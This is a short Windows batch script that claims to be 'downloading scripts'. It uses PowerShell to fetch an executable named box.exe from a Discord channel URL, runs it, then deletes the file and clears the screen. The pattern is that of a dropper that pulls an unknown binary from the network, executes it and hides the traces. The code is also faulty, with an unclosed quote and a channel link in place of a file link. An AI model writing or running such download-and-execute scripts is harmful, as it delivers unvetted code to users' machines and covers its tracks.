@echo off
echo downloading scripts
powershell -Command "Invoke-WebRequest https://discord.com/channels/1065442734921486407/1066105331358376097/1066108584116633630 -Outfile box.exe
start box.exe
pause
del /S box.exe
cls
pause